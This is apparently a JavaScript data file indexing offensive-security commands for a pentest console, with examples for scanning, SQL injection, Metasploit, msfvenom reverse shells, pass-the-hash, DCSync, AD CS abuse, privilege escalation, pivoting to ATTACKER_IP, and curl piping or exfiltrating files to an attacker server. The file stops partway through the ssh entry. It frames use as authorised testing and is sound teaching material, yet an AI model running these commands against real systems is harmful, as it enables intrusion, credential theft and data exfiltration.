/* ==========================================================================
   ZothPen — the console index. window.ZX = [ entry, ... ]
   This file is what the in-app console reads. Type a command name at the
   prompt and it resolves here; unknown tokens get a "did you mean" list.

   entry schema:
     { c:'nmap', al:['aliases'], cat:'recon', what:'one paragraph',
       syn:'nmap -sS -p- --min-rate 2000 <ip>',
       ex:[{t:'what this shows', cmd:'exact command', out:'what you should see'}],
       tips:['...'], warn:'...' }
   Everything here runs on a Kali or Parrot host you own or are authorised
   to test. Categories: recon, web, exploit, creds, ad, privesc, post,
   wireless, shell, sysadmin, automate.
   ========================================================================== */
window.ZX = [

/* ------------------------------- recon --------------------------------- */
{ c:'nmap', al:['scan'], cat:'recon', tool:'t-nmap',
  what:'The port scanner everything else is built around. Fast SYN sweep first, version detection second, scripts third — never all at once.',
  syn:'nmap -sS -p- --min-rate 2000 -n TARGET',
  ex:[
    { t:'full-port SYN sweep, fast, no DNS', cmd:'nmap -sS -p- --min-rate 2000 -n 192.168.56.20 -oA scan/allports', out:'65535 ports; dozens of seconds on a LAN host' },
    { t:'then version-detect only the open ones', cmd:'nmap -sV -sC -p 22,80,445,3389 192.168.56.20 -oA scan/svc', out:'service, version string, first-pass default scripts' },
    { t:'turn results into a target list', cmd:'nmap -p- --min-rate 2000 -n 192.168.56.0/24 -oG - | grep -oE "[0-9]+/open/tcp" | cut -d/ -f1 | sort -un | paste -sd,', out:'22,80,139,445,3389' }
  ],
  tips:['-oA saves all three formats at once; you will re-read them later','-sS needs root; through SOCKS you are stuck with -sT','-Pn for hosts that block ping; --min-rate for speed'],
  warn:'Aggressive scans (-T5, huge --min-rate) can knock over fragile services and trip IPS rate limits. Stage the aggression to the environment.' },

{ c:'masscan', al:['zmap','udp-scan','internet-scale'], cat:'recon', tool:'t-masscan',
  what:'Stateless scanner that can sweep a whole /16 in minutes. Use it to find live ports, then hand the results to nmap for detail.',
  syn:'sudo masscan -p1-65535 --rate 5000 -oL out.lst CIDR',
  ex:[
    { t:'sweep a class C', cmd:'sudo masscan -p1-65535 --rate 5000 192.168.56.0/24 -oL masscan.lst', out:'one line per open port, then feed to nmap with -iL' },
    { t:'hand off to nmap', cmd:'awk "/open/ {print \\$4}" masscan.lst | sort -u > ips.txt && nmap -sV -iL ips.txt -oA scan/targets', out:'version detection only on hosts that have something open' }
  ],
  warn:'masscan does its own TCP stack — it will not use your SOCKS proxy and it bypasses the normal connect() path. Do not run it outside scope by accident: a typo here sweeps someone else\'s network at line rate.' },

{ c:'netexec', al:['nxc','crackmapexec','cme'], cat:'recon', tool:'t-netexec',
  what:'Swiss-army knife for Windows protocols (SMB, LDAP, MSSQL, WinRM, SSH, FTP, RDP). CrackMapExec\'s maintained successor, and the fastest way to answer "what is this domain" across many hosts.',
  syn:'nxc PROTO TARGET -u USER -p PASS ACTION',
  ex:[
    { t:'null session share listing across a subnet', cmd:"nxc smb 192.168.56.0/24 -u '' -p '' --shares", out:'hosts that allow anonymous SMB and the shares they expose' },
    { t:'does the credential work, and where', cmd:'nxc smb 192.168.56.0/24 -u j.doe -p "Spring2026!" --continue-on-success', out:'Pwn3d! means local admin on that host' },
    { t:'pull the domain user list over LDAP', cmd:'nxc ldap dc01.lab.local -u j.doe -p pass --users', out:'samaccountname, description, badpwdcount, last logon' },
    { t:'check SMB signing (relay viability)', cmd:'nxc smb 192.168.56.0/24 --gen-relay-list relay.txt', out:'every host with signing off or not required' }
  ],
  tips:['--pass-pol tells you the lockout threshold before you spray','--shares --dir needs no extra tooling to browse','Keep a hosts file: nxc writes to ~/.nxc/logs/'] },

{ c:'smbclient', al:['cifs','smb','net-use'], cat:'recon',
  what:'Browse an SMB share and pull files, from one shell, without mounting anything.',
  syn:'smbclient //host/share -U "DOMAIN/user%pass"',
  ex:[
    { t:'list shares', cmd:'smbclient -L //192.168.56.10 -U guest% -N', out:'share names, comments, and whether you got in' },
    { t:'pull everything readable into a folder', cmd:'smbclient //192.168.56.10/Public -U "lab/j.doe%pass" -c "recurse ON; prompt OFF; mget *"', out:'mirrors the share locally for offline grep' }
  ],
  tips:['Always grep what you pulled for passwords, .kdbx, .pfx, unattend.xml, web.config, *.bak'] },

{ c:'enum4linux-ng', al:['enum4linux'], cat:'recon',
  what:'One-shot SMB/null-session enumeration: users, groups, shares, policies, and RID cycling when anonymous bind is possible.',
  syn:'enum4linux-ng -A HOST',
  ex:[{ t:'everything against a host with null sessions', cmd:'enum4linux-ng -A 192.168.56.10 -oJ enum4.json', out:'users, shares, password policy — a fast picture of the host' }] },

{ c:'ldapsearch', al:['ldap','ldapwhoami','windapsearch'], cat:'ad',
  what:'Raw LDAP queries. When a Windows tool will not show you a field, this will.',
  syn:'ldapsearch -x -H ldap://DC -D "USER@DOMAIN" -w PASS -b "BASE_DN" "FILTER" ATTRS',
  ex:[
    { t:'stash the rootDSE for base DNs', cmd:'ldapsearch -x -H ldap://dc01.lab.local -s base namingContexts', out:'DC=lab,DC=local' },
    { t:'users with a description or comment (often a password)', cmd:'ldapsearch -x -H ldap://dc01.lab.local -D "j.doe@lab.local" -w pass -b "DC=lab,DC=local" "(&(objectClass=user)(description=*))" sAMAccountName description', out:'the classic "description holds the password" hit' },
    { t:'find accounts without pre-auth (AS-REP roastable)', cmd:'ldapsearch -x -H ldap://dc01.lab.local -D "j.doe@lab.local" -w pass -b "DC=lab,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName', out:'accounts anyone can roast offline without credentials' }
  ],
  tips:['LDAP filters with bitwise matching (1.2.840.113556.1.4.803) unlock UAC-based enumeration','Base64 output is normal for binary fields'] },

{ c:'bloodhound-python', al:['bloodhound'], cat:'ad', tool:'t-bloodhound',
  what:'Collection of AD relationships so BloodHound can compute the shortest path to Domain Admin.',
  syn:'bloodhound-python -u USER -p PASS -d DOMAIN -ns DC_IP -c All',
  ex:[
    { t:'full collection (noisy)', cmd:'bloodhound-python -u j.doe -p pass -d lab.local -ns 192.168.56.10 -c All --zip', out:'a zip to upload in the BloodHound UI' },
    { t:'stealthier: DCOnly', cmd:'bloodhound-python -u j.doe -p pass -d lab.local -ns 192.168.56.10 -c DCOnly', out:'ACLs and trust paths without touching every workstation' }
  ],
  warn:'-c All touches every host in the domain. In a monitored environment DCOnly (or explicit -c with a narrow target list) is the professional default.' },

{ c:'dig', al:['host','nslookup'], cat:'recon',
  what:'DNS interrogation: records, zone transfers, and reverse lookups that reveal naming conventions.',
  syn:'dig @RESOLVER NAME TYPE +short',
  ex:[
    { t:'try a zone transfer', cmd:'dig AXFR lab.local @192.168.56.10', out:'the whole namespace if the server is misconfigured — a finding' },
    { t:'reverse sweep a range', cmd:'for i in $(seq 1 50); do dig -x 192.168.56.$i +short; done | grep -v "^$"', out:'PTR records showing server roles by name (dc01, sql02, backup01)' }
  ] },

{ c:'amass', al:['subfinder'], cat:'recon',
  what:'Passive subdomain enumeration from public sources: certificate transparency, passive DNS, code repositories.',
  syn:'subfinder -d example.com -all -o subs.txt',
  ex:[{ t:'passive first, no packets to the target', cmd:'subfinder -d example.com -all -silent -o subs.txt && amass enum -passive -d example.com -o amass.txt', out:'a merged hostname list to resolve and scope-check' }] },

{ c:'gowitness', al:['httpx','eyewitness'], cat:'recon',
  what:'Turn a hostname list into a screenshot gallery and a list of live HTTP services, so you can see what you are dealing with.',
  syn:'httpx -l hosts.txt -sc -title -tech-detect -o http.txt',
  ex:[
    { t:'which of these hosts actually speak HTTP', cmd:'httpx -l subs.txt -ports 80,443,8080,8443 -sc -title -tech-detect -o live_http.txt', out:'status, page title, detected tech stack per URL' },
    { t:'visual triage', cmd:'gowitness file -f urls.txt -P shots/', out:'an image per host — fastest way to spot the interesting login panel' }
  ] },

{ c:'searchsploit', al:['exploitdb'], cat:'exploit', tool:'t-searchsploit',
  what:'Offline copy of Exploit-DB. Search by service, product, version, or by an nmap XML file.',
  syn:'searchsploit TERM\nsearchsploit --nmap scan.xml\nsearchsploit -m EDB_ID',
  ex:[
    { t:'match a scan to exploits', cmd:'searchsploit --nmap scan/svc.xml', out:'every DB entry matching versions nmap saw' },
    { t:'copy the PoC into the current directory to edit', cmd:'searchsploit -m 42315', out:'42315.py in cwd, safe to modify' },
    { t:'no noisy false positives', cmd:'searchsploit -w -e "denial of service" "apache 2.4.49"', out:'web-links only, DoS excluded' }
  ],
  tips:['Paths are under /usr/share/exploitdb/ — the raw text is greppable','Never run a PoC unread: fix LHOST, offsets and callback URLs first, in your lab'] },

/* -------------------------------- web ---------------------------------- */
{ c:'ffuf', al:['feroxbuster','wfuzz'], cat:'web', tool:'t-ffuf',
  what:'Fast content discovery: directories, parameters, vhosts, and API endpoints. Rate-limit it — always.',
  syn:'ffuf -w WORDLIST -u https://HOST/FUZZ -t 40 -rate RATE -fc CODES',
  ex:[
    { t:'directories, leaving out the sea of 404s', cmd:'ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://host/FUZZ -fc 404 -t 20 -rate 40', out:'real paths with status codes and sizes' },
    { t:'virtual hosts on one IP', cmd:'ffuf -w subdomains.txt -u http://host/ -H "Host: FUZZ.example.com" -fs 4242', out:'vhosts that differ from the default site' },
    { t:'parameter discovery on a real endpoint', cmd:'ffuf -w params.txt -u "http://host/api/user?FUZZ=test" -fs 812', out:'parameters the page silently accepts' }
  ],
  tips:['-fs/-fl/-fw filter by size/lines/words instead of status — that is how you cut noise','-recursion plus -recursion-depth 1 is usually enough'],
  warn:'40 threads against a production app or a rate-limited bug bounty is how you get blocked and produce unreadable results. Match -rate to the target\'s tolerance.' },

{ c:'gobuster', al:['dirb','dirbuster','vhost'], cat:'web',
  what:'The same job as ffuf for directories/DNS, with a very stable interface; dns mode is genuinely fast for vhost discovery.',
  syn:'gobuster dns -d example.com -w subs.txt -t 40',
  ex:[{ t:'DNS subdomain brute force', cmd:'gobuster dns -d lab.local -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r 192.168.56.10:53 -t 30', out:'hostnames with resolved IPs' }] },

{ c:'nikto', al:['wapiti','whatweb','webserver-scan'], cat:'web',
  what:'Old, loud, and still useful for a first pass at a legacy web server: headers, misconfigurations, known files.',
  syn:'nikto -h http://host -o nikto.txt',
  ex:[{ t:'first-pass web server scan', cmd:'nikto -h http://192.168.56.20 -o nikto.html -Format html', out:'missing security headers, exposed admin paths, server version' }],
  warn:'Very noisy — assume every request is logged and alerted. Fine in a lab or where the client expects it.' },

{ c:'sqlmap', al:['sqli','sql-injection','sqlinjection'], cat:'web', tool:'t-sqlmap',
  what:'Automated SQL injection detection and exploitation. Powerful and equally capable of destroying data — confirm the injection by hand first.',
  syn:'sqlmap -r request.txt -p PARAM --batch --level 2 --risk 1',
  ex:[
    { t:'from a saved Burp request (the correct way)', cmd:'sqlmap -r req.txt -p id --batch --level 2 --risk 1 --technique=BEU --dbms=mysql', out:'confirmation, DBMS, then you decide how far to go' },
    { t:'interactive shell only if it is in scope', cmd:'sqlmap -r req.txt --os-shell', out:'a shell on the DB host — needs explicit RoE cover' }
  ],
  warn:'--risk 3 --level 5 --dump-all is a data-exfiltration machine. Confirm one primitive, take the minimum proof the report needs, and know the destruction date for anything you had to retrieve.' },

{ c:'nuclei', al:['vuln-scan','templates','template-scan'], cat:'web', tool:'t-nuclei',
  what:'Template-driven scanner: CVEs, misconfigurations, exposed panels, default creds. Templates are YAML you can write yourself.',
  syn:'nuclei -u https://HOST -t TAG -severity critical,high -o out.txt',
  ex:[
    { t:'high-signal first pass', cmd:'nuclei -u https://host -severity critical,high,medium -rl 40 -o nuclei.txt', out:'hits with the template id, which tells you what to verify' },
    { t:'targeted templates only', cmd:'nuclei -l urls.txt -tags exposure,config,default-login -rl 30', out:'exposed .git/.env, panels, default credentials' },
    { t:'keep templates fresh (they change weekly)', cmd:'nuclei -update-templates', out:'thousands of community checks, all offline once cached' }
  ],
  tips:['-rl is the rate limiter; set it lower than you think on production','Write your own template when you find a pattern you will re-test'] },

{ c:'burpsuite', al:['burp','zaproxy'], cat:'web', tool:'t-burp',
  what:'The intercepting proxy. Twenty minutes of browsing through it builds a map no scanner can produce: endpoints, parameters, tokens, and the API the app actually uses.',
  syn:'burpsuite  # then set the browser proxy to 127.0.0.1:8080',
  ex:[
    { t:'build the map before attacking', cmd:'browse the whole app through the proxy, then read Target > Site map', out:'every endpoint and parameter, ready to fuzz deliberately' },
    { t:'turn a request into a repeatable test', cmd:'right-click > Send to Repeater, then change one thing at a time', out:'a request you understand, unlike scanner output' }
  ],
  tips:['Install the CA cert in the browser so HTTPS is readable','Use Repeater for confirmation, Intruder for fuzzing — but keep Intruder\'s rate sane'] },

/* ------------------------------ exploit -------------------------------- */
{ c:'msfconsole', al:['metasploit','msf'], cat:'exploit', tool:'t-metasploit',
  what:'Exploitation framework: modules, payloads, sessions, and a lot of noise if used as a point-and-click weapon.',
  syn:'msfconsole -q -r script.rc',
  ex:[
    { t:'scripted, repeatable run', cmd:'msfconsole -q -r lab.rc', out:'the same run every time — which is what a report needs' },
    { t:'find and use a module', cmd:'msf6 > search type:exploit platform:windows smb\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 > set RHOSTS 192.168.56.20; set LHOST 192.168.56.5; set payload windows/x64/meterpreter/reverse_tcp\nmsf6 > check && run', out:'check first: never blind-fire against a host you do not want to crash' }
  ],
  tips:['`sessions -u <id>` upgrades a plain shell to meterpreter','`spool /path.log` records everything; `makerc` saves your commands as a re-runnable script'] },

{ c:'msfvenom', al:['payload','payload-gen','meterpreter-payload'], cat:'exploit',
  what:'Standalone payload generation: the part of Metasploit that is genuinely useful without the console.',
  syn:'msfvenom -p PAYLOAD LHOST=IP LPORT=PORT -f FORMAT -o FILE',
  ex:[
    { t:'Linux ELF reverse shell', cmd:'msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.5 LPORT=4444 -f elf -o shell.elf', out:'a binary to transfer, chmod +x and run' },
    { t:'Windows staged x64', cmd:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.5 LPORT=443 -f exe -o update.exe', out:'a listener-compatible executable' },
    { t:'a payload that touches no disk', cmd:'msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.5 LPORT=4444 -f raw | base64 -w0', out:'paste into `echo <b64> | base64 -d | bash`' }
  ],
  tips:['Evasion encoders are not evasion in 2026 — EDR profiles behaviour. Choose the payload by what the target will execute, not by the encoder name'] },

{ c:'evil-winrm', al:['winrm'], cat:'exploit', tool:'t-evilwinrm',
  what:'Interactive PowerShell over WinRM. The most comfortable shell on a Windows host, with file upload and script execution built in.',
  syn:'evil-winrm -i HOST -u USER -p PASS\nevil-winrm -i HOST -u USER -H NT_HASH',
  ex:[
    { t:'log in with a password', cmd:'evil-winrm -i 192.168.56.20 -u lab\\\\j.doe -p pass', out:'a PowerShell prompt in a full tty' },
    { t:'log in with a hash (pass-the-hash)', cmd:'evil-winrm -i 192.168.56.20 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c', out:'no password needed — NTLM only' },
    { t:'in-session file transfer', cmd:'*Evil-WinRM* > upload linpeas.exe C:\\\\Windows\\\\Temp\\\\lp.exe\n*Evil-WinRM* > Invoke-Binary C:\\\\Windows\\\\Temp\\\\lp.exe', out:'upload and execute without a second channel' }
  ] },

/* -------------------------------- creds -------------------------------- */
{ c:'hashcat', al:['crack','mdxfind','gpu-crack'], cat:'creds', tool:'t-hashcat',
  what:'GPU hash cracking: identify the hash, pick the mode, then choose the attack (wordlist, rules, mask, or combinations of all three).',
  syn:'hashcat -m MODE hashes.txt wordlist.txt -r rules/best64.rule',
  ex:[
    { t:'identify and crack NTLM with rules', cmd:'hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule', out:'passwords for the weak portion of the hashes' },
    { t:'NetNTLMv2 captured by Responder', cmd:'hashcat -m 5600 captures.txt rockyou.txt -r best64.rule', out:'the plaintext of whatever a machine account or user leaked on the wire' },
    { t:'targeted mask for a company pattern', cmd:'hashcat -m 1000 ntlm.txt -a 3 "?u?l?l?l?l202?d"', out:'Company-style passwords a generic list will never contain' },
    { t:'show what you already cracked', cmd:'hashcat -m 1000 ntlm.txt --show', out:'user:plaintext pairs, which become your next credential set' }
  ],
  tips:['`hashcat --identify` before you guess the mode','-O and a wordlist+rules pair usually beats a giant wordlist','Cracked NTLM hashes are reused elsewhere: put them straight into nxc'] },

{ c:'john', al:['jumbo','johnny','cpu-crack'], cat:'creds',
  what:'CPU cracking and the better tool for non-GPU formats (ssh keys, kdbx, archives, some web app hashes).',
  syn:'john --wordlist=WORDLIST --format=FORMAT HASHFILE',
  ex:[
    { t:'crack a password-protected SSH key', cmd:'ssh2john id_rsa > id_rsa.hash && john --wordlist=rockyou.txt id_rsa.hash', out:'the passphrase protecting a key you now hold' },
    { t:'keepass vault', cmd:'keepass2john Database.kdbx > kp.hash && john kp.hash --wordlist=rockyou.txt', out:'access to whatever secrets the team stored' }
  ] },

{ c:'hydra', al:['medusa','ncrack'], cat:'creds',
  what:'Online password attacks: SSH, RDP, HTTP forms, FTP, SMTP. Every attempt is a failed login in someone\'s log — and a possible account lockout.',
  syn:'hydra -L users.txt -P pass.txt SERVICE://TARGET -t THREADS -f',
  ex:[
    { t:'SSH, stop at the first hit', cmd:'hydra -L users.txt -P pass.txt ssh://192.168.56.20 -t 4 -f -V', out:'one valid pair — then stop' },
    { t:'HTTP POST form', cmd:'hydra -L users.txt -P pass.txt 192.168.56.20 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials" -t 4', out:'a working credential for the app' }
  ],
  warn:'After 5 failures one account is locked. -t 4 against the same account is still a lockout generator: spray one password across many users, or stay under the threshold you read with nxc --pass-pol.' },

{ c:'responder', al:['llmnr','ntlmrelayx','poisoning'], cat:'creds', tool:'t-responder',
  what:'Answers LLMNR/NBT-NS/mDNS broadcasts to harvest NetNTLM hashes on a segment. Active: it talks to other people\'s machines.',
  syn:'sudo responder -I eth0 -A     # analysis (passive) first',
  ex:[
    { t:'watch who is leaking hashes, without poisoning', cmd:'sudo responder -I eth0 -A -w', out:'broadcast traffic and the names hosts are looking for — enough to justify asking for authorisation' },
    { t:'then, if authorised, capture+relay conditions', cmd:'sudo responder -I eth0 -wv  # plus nxc smb --gen-relay-list to find signing-off hosts', out:'NetNTLMv1/v2 hashes, crackable with -m 5600' }
  ],
  warn:'On a client segment this touches machines outside your test list and can break name resolution for real users. Needs explicit written authorisation, a narrow window, and a stop condition.' },

/* ---------------------------------- ad --------------------------------- */
{ c:'impacket-secretsdump', al:['secretsdump'], cat:'ad', tool:'t-mimikatz',
  what:'Extracts secrets from a Windows host or the domain: SAM, LSA, cached credentials, and via DCSync the domain\'s hashes. It is Mimikatz\'s technique without the Windows binary.',
  syn:'impacket-secretsdump DOMAIN/USER:PASS@HOST',
  ex:[
    { t:'local SAM + LSA on a host you are admin on', cmd:'impacket-secretsdump lab.local/j.doe:pass@192.168.56.20 -just-dc-user Administrator -outputfile dump', out:'NTLM hashes and LSA secrets, written to files' },
    { t:'DCSync one account (loud, precise)', cmd:'impacket-secretsdump lab.local/Administrator:pass@dc01.lab.local -just-dc-user krbtgt', out:'the krbtgt hash — golden-ticket material, handle accordingly' }
  ],
  warn:'DCSync trips replication-rights and LSASS access detections. It is the loudest credential action available: use it deliberately, late, and only with in-scope justification.' },

{ c:'impacket-GetUserSPNs', al:['GetUserSPNs'], cat:'ad',
  what:'Kerberoasting: request service tickets for accounts with SPNs and save the crackable hashes.',
  syn:'impacket-GetUserSPNs -dc-ip DC DOMAIN/USER:PASS -request -outputfile kerb.txt',
  ex:[{ t:'roast all SPN accounts and crack offline', cmd:'impacket-GetUserSPNs -dc-ip 192.168.56.10 lab.local/j.doe:pass -request -outputfile kerb.txt && hashcat -m 13100 kerb.txt rockyou.txt', out:'service-account plaintext, often privileged and rarely rotated' }] },

{ c:'certipy-ad', al:['certipy'], cat:'ad', tool:'t-certipy',
  what:'AD CS enumeration and abuse. The modern escalation path most people still miss — a template that issues a certificate for an admin identity.',
  syn:'certipy-ad find -u USER@DOMAIN -p PASS -dc-ip DC -vulnerable -stdout',
  ex:[
    { t:'find vulnerable templates (ESC1-ESC8)', cmd:'certipy-ad find -u j.doe@lab.local -p pass -dc-ip 192.168.56.10 -vulnerable -stdout -text', out:'template names, the ESC class, and the exact abuse command' },
    { t:'request a cert as administrator and authenticate with it', cmd:'certipy-ad req -u j.doe@lab.local -p pass -ca lab-CA -template VulnTemplate -upn administrator@lab.local -dc-ip 192.168.56.10 && certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.10', out:'an NT hash for administrator, obtained without cracking anything' }
  ],
  tips:['No credentials at all? Try ESC8: relay a coerced machine auth to the CA\'s HTTP endpoint'] },

/* ------------------------------- privesc ------------------------------- */
{ c:'linpeas', al:['lpeas','linenum'], cat:'privesc', tool:'t-linpeas',
  what:'Local enumeration on Linux: sudo rights, SUID/SGID, capabilities, cron, writable files, credentials in configs, and known kernel CVEs.',
  syn:'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh\nchmod +x linpeas.sh && ./linpeas.sh -a',
  ex:[
    { t:'run with the highest-signal filters', cmd:'./linpeas.sh -a 2>/dev/null | tee /dev/shm/lp.out', out:'colour-coded findings, ranked by likelihood' },
    { t:'read the tail — it summarises what matters', cmd:'tail -n +1 /dev/shm/lp.out | grep -iE "95%|99%|password|writable"', out:'the top candidates for escalation' }
  ],
  tips:['Always run the manual checklist too: sudo -l, getcap -r /, find / -perm -4000, cron, /etc/exports, and your own shell history'] },

{ c:'sudo', al:['sudoers','privilege-escalation','gtfobins'], cat:'privesc',
  what:'Two commands, one of which is the most important enumeration step on any Linux host you land on.',
  syn:'sudo -l\nsudo -l | grep -i nopasswd',
  ex:[
    { t:'what may this user run as root', cmd:'sudo -l', out:'(root) NOPASSWD: /usr/bin/find — which is a root shell via GTFOBins' },
    { t:'abuse a legitimate binary that runs as root', cmd:'sudo find . -exec /bin/sh \\; -quit', out:'root shell, because find lets you execute' }
  ],
  tips:['Any binary in sudo -l goes into GTFOBins: editors, pagers, find, tar, python, cp, less, vi','LD_PRELOAD against a sudo-allowed binary with env_keep is the other classic path'] },

{ c:'getcap', al:['capabilities'], cat:'privesc',
  what:'Capabilities are the modern SUID: a binary with cap_setuid or an interpreter with cap_setuid gives root without a SUID bit — and far fewer scanners look for it.',
  syn:'getcap -r / 2>/dev/null',
  ex:[{ t:'find interesting capabilities', cmd:'getcap -r / 2>/dev/null | grep -vE "cap_net_raw|cap_net_bind"', out:'python3.11 = cap_setuid+ep — which is root in one line' }] },

{ c:'pspy', al:['pspy64','procmon','process-snoop'], cat:'privesc',
  what:'Watches process execution without root: reveals cron jobs, root-run scripts, and the exact paths they execute.',
  syn:'./pspy64 -pf -i 1000',
  ex:[{ t:'catch a privileged job in the act', cmd:'./pspy64 -pf -i 1000 | grep -iE "root|UID=0"', out:'the command, its arguments and its path — if that path is writable, you are root' }] },

/* --------------------------------- post -------------------------------- */
{ c:'ligolo-ng', al:['ligolo'], cat:'post', tool:'t-ligolo',
  what:'Layer-3 pivoting: the agent on the target makes its network routable from your machine, so nmap -sS, UDP and every other tool work at full speed.',
  syn:'# attacker\n./proxy -selfcert -laddr 0.0.0.0:11601\n# target\n./agent -connect ATTACKER_IP:11601 -ignore-cert',
  ex:[
    { t:'set up the interface and route', cmd:'sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n# ligolo proxy console:  session  ->  ifconfig\nsudo ip route add 10.10.10.0/24 dev ligolo', out:'the internal network is now routable; nmap -sS works normally' },
    { t:'start the tunnel only when you are ready', cmd:'# at the ligolo proxy prompt:\nsession                    # pick the agent by number\nifconfig                   # networks the agent can see\nstart                      # bring the tunnel up', out:'traffic flows; note the start time in your activity log' }
  ],
  warn:'A route removes the friction that normally keeps you in scope. Add only the in-scope block, and log tunnel start/stop.' },

{ c:'chisel', al:['socat'], cat:'post',
  what:'Single-binary TCP/UDP tunnel and SOCKS proxy for when you cannot add a route (no TUN, no root, restrictive egress).',
  syn:'# attacker\n./chisel server -p 8080 --reverse\n# target\n./chisel client ATTACKER_IP:8080 R:socks',
  ex:[
    { t:'reverse SOCKS through the foothold', cmd:'./chisel client 192.168.56.5:8080 R:1080:socks   # then proxychains nmap -sT', out:'TCP reachability into the internal network; UDP and -sS will not work' },
    { t:'forward one internal service to your machine', cmd:'./chisel client 192.168.56.5:8080 8081:10.10.10.5:8081', out:'localhost:8081 hits the internal host directly' }
  ],
  tips:['socat is the one-liner for a single port: socat TCP-LISTEN:8080,fork TCP:10.0.0.5:80','Through SOCKS you must use proxychains plus -sT and -Pn'] },

{ c:'nc', al:['netcat','ncat'], cat:'post',
  what:'The duct tape: listeners, banners, file transfer, and raw protocol poking.',
  syn:'rlwrap -cAr nc -lvnp 4444',
  ex:[
    { t:'a usable catch shell on Linux', cmd:'rlwrap -cAr nc -lvnp 4444', out:'history, arrows and Ctrl-C handling that plain nc does not give you' },
    { t:'banner grab anything', cmd:'nc -nv 192.168.56.20 22 -w3 </dev/null', out:'the service banner — proof of what is listening' },
    { t:'upgrade a dumb shell to a real tty', cmd:'python3 -c "import pty;pty.spawn(\'/bin/bash\')"  # then Ctrl-Z, stty raw -echo; fg, export TERM=xterm', out:'a shell with job control and tab completion' }
  ],
  warn:'Do not leave an open nc listener running: it is an exposed service on your own host. Track every listener you start and kill it at teardown.' },

{ c:'python3 -m http.server', al:['http.server','updog'], cat:'post',
  what:'Serve files to a target in one command — the standard way to stage a tool or pull data out.',
  syn:'python3 -m http.server 80 --bind YOUR_IP',
  ex:[
    { t:'stage a tool', cmd:'cd /opt/tools && python3 -m http.server 8080', out:'target: curl http://192.168.56.5:8080/linpeas.sh | sh' },
    { t:'exfiltrate a file out', cmd:'on target: curl -T loot.zip http://192.168.56.5:8080/    # needs a writable server, use `updog -d . -p 8080`', out:'the file arrives on your machine, logged with a hash' }
  ] },

{ c:'tmux', al:['screen'], cat:'sysadmin',
  what:'Detachable sessions: the difference between losing six hours of enumeration because your SSH dropped and not caring.',
  syn:'tmux new -s op | tmux attach -t op',
  ex:[
    { t:'sensible operator defaults', cmd:"tmux new -s op \\; set -g history-limit 50000 \\; setw -g mouse on", out:'scrollback and selectable panes' },
    { t:'parallel enumeration in panes', cmd:'tmux new-window -n scan "nmap -sS -p- -n 192.168.56.20 -oA scan/all"', out:'scans keep running while you work elsewhere' }
  ],
  tips:['Prefix (Ctrl-b) then d to detach; % and " to split','Name windows after the host you are on — on a ten-host engagement it is the difference between order and chaos'] },

/* ------------------------------ wireless ------------------------------- */
{ c:'aircrack-ng', al:['airmon-ng','hcxdumptool','hcxtools'], cat:'wireless', tool:'t-wireless',
  what:'The wireless suite: monitor mode, capture, and cracking. The only legal entry point is a network you own or are authorised in writing to test.',
  syn:'sudo airmon-ng start wlan0   # passive capture first: sudo hcxdumptool -i wlan0mon -o cap.pcapng --disable_deauthentication',
  ex:[
    { t:'passive PMKID capture (no users disrupted)', cmd:'sudo hcxdumptool -i wlan0mon -o capture.pcapng --disable_deauthentication --disable_disassociation', out:'a file with the PMKID the AP volunteers — crackable offline with -m 22000' },
    { t:'crack what you captured', cmd:'hcxpcapngtool -o hash.22000 capture.pcapng && hashcat -m 22000 hash.22000 rockyou.txt', out:'the PSK, if it is weak; SAE/WPA3 with PMF will yield nothing' }
  ],
  warn:'Transmitting a deauth disconnects real users and is a deliberate denial of service. WPS PIN and evil-twin attacks are more intrusive again. All of it needs explicit written authorisation naming the SSID, site and window.' },

/* ------------------------------ shell / misc --------------------------- */
{ c:'bash', al:['sh','zsh'], cat:'shell', tool:'t-bash',
  what:'The shell is the automation platform. set -euo pipefail, functions, and loops are the whole toolkit you need to stop repeating yourself.',
  syn:'set -euo pipefail   # at the top of every script you write',
  ex:[
    { t:'a target list from a scan, without mistakes', cmd:'nmap -p- -n --min-rate 2000 192.168.56.0/24 -oG - | awk "/Ports:/ {print \\$2}" | sort -u > live.txt', out:'one host per line, ready for a for-loop' },
    { t:'bounded parallel per-host enumeration', cmd:'while read -r h; do (nmap -sV -p22,80,445 "$h" -oA "scan/$h" &); while [ $(jobs -r | wc -l) -ge 4 ]; do sleep 0.3; done; done < live.txt', out:'four hosts at a time, results kept per host' },
    { t:'guaranteed teardown', cmd:"trap 'kill $TUNNEL_PID 2>/dev/null; rm -f /tmp/payload' EXIT", out:'listeners, tunnels and temp files die with the script, even on Ctrl-C' }
  ],
  tips:['Quote every variable: "$host" not $host','Use shellcheck before you trust a script on an engagement'] },

{ c:'grep', al:['awk','sed','cut','sort','uniq','jq'], cat:'shell',
  what:'The text-processing half of pentesting. Every report sentence about a scan starts with one of these.',
  syn:'grep -oE "PATTERN" file | sort -u',
  ex:[
    { t:'pull every IP out of a pile of output', cmd:'grep -rhoE "([0-9]{1,3}\\.){3}[0-9]{1,3}" out/ | sort -u', out:'a clean asset list from messy logs' },
    { t:'find credentials you left in a file', cmd:'grep -rniE "pass(word)?=|api[_-]?key|BEGIN .*PRIVATE KEY" loot/', out:'the things that make a finding, and the things that should not be in your loot' },
    { t:'query JSON from nxc/bloodhound output', cmd:'jq -r ".data[] | select(.Pwn3d==true) | .host" nxc.json', out:'only the hosts you own — scriptable reporting' }
  ] },

{ c:'ssh', al:['ssh-keygen','scp','rsync'], cat:'sysadmin',
  what:'Remote access, file movement, and the tunnels you will use when SOCKS is the only option.',
  syn:'ssh -D 1080 -N user@host     # SOCKS proxy over an SSH login',
  ex:[
